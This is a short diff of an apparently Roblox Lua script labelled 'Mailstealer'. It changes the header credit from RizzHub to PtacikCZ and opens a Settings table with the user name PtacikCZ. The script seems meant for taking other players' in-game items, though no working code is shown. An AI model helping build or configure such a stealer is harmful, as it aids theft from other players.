@@ -1,4 +1,4 @@
--- [RizzHub Mailstealer]
+-- [PtacikCZ Mailstealer]
 
 getgenv().Settings = {
     User = "PtacikCZ",
